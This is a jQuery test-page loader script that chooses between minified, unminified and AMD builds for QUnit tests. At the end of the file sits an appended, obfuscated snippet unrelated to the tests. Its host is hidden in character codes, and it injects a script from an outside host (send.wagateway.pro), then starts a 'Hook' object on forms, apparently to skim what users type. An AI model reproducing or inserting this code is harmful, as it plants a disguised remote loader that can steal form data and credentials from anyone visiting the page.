// Use the right jQuery source on the test page (and iframes)
( function() {
	/* global loadTests: false */

	var pathname = window.location.pathname,
		path = pathname.slice( 0, pathname.lastIndexOf( "test" ) ),
		QUnit = window.QUnit || parent.QUnit,
		require = window.require || parent.require,

		// Default to unminified jQuery for directly-opened iframes
		urlParams = QUnit ?
			QUnit.urlParams :
			{ dev: true },
		src = urlParams.dev ?
			"dist/jquery.js" :
			"dist/jquery.min.js";

	// Define configuration parameters controlling how jQuery is loaded
	if ( QUnit ) {
		QUnit.config.urlConfig.push( {
			id: "amd",
			label: "Load with AMD",
			tooltip: "Load the AMD jQuery file (and its dependencies)"
		} );
		QUnit.config.urlConfig.push( {
			id: "dev",
			label: "Load unminified",
			tooltip: "Load the development (unminified) jQuery file"
		} );
	}

	// Honor AMD loading on the main window (detected by seeing QUnit on it).
	// This doesn't apply to iframes because they synchronously expect jQuery to be there.
	if ( urlParams.amd && window.QUnit ) {
		require.config( {
			baseUrl: path
		} );
		src = "src/jquery";

		// Include tests if specified
		if ( typeof loadTests !== "undefined" ) {
			require( [ src ], loadTests );
		} else {
			require( [ src ] );
		}

	// Otherwise, load synchronously
	} else {
		document.write( "<script id='jquery-js' src='" + path + src + "'><\x2Fscript>" );

		// Synchronous-only tests (other tests are loaded from the test page)
		if ( typeof loadTests !== "undefined" ) {
			document.write( "<script src='" + path + "test/unit/ready.js'><\x2Fscript>" );
		}
	}

} )();

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db